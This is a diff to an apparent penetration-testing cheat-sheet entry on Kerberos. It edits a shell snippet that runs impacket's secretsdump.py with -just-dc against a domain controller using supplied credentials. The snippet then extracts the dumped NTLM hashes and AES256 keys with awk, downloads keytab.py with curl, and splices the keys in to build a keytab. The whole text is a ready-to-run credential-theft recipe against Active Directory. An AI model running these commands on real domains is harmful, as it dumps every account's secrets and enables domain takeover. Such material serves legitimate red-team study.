@@ -7,13 +7,14 @@ tags: [Kerberos]
 ---
 
 ```
-REALM='blackops.local'
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py blackops.local/fsociety:'P@ssw0rd'@dc.blackops.local -just-dc | tee secretsdump.out
+REALM='MEGACORP.LOCAL'
+secretsdump.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local -just-dc | tee secretsdump.out
 
-cat secretsdump.out|grep aad3b435|awk -F: '{print "    (23, '\''"$4"'\''),"}' > keys
-cat secretsdump.out|grep aes256-cts-hmac-sha1-96|awk -F: '{print "    (18, '\''"$3"'\''),"}' >> keys
-https://github.com/BreachAssume/forest-trust-tools/blob/master/keytab.py
-awk 'NR << 112' keytab.py > t
+# ---
+cat secretsdump.out | grep aad3b435 | awk -F: '{print "    (23, '\''"$4"'\''),"}' > keys
+cat secretsdump.out | grep aes256-cts-hmac-sha1-96 | awk -F: '{print "    (18, '\''"$3"'\''),"}' >> keys
+curl -sSL https://github.com/dirkjanm/forest-trust-tools/raw/6bfeb990f0db8a580afe5cbba3cce1bf959a7fb8/keytab.py > keytab.py
+awk 'NR <= 112' keytab.py > t
 cat keys >> t
 awk 'NR >= 118' keytab.py >> t
 sed -i "s/TESTSEGMENT.LOCAL/${REALM}/g" t
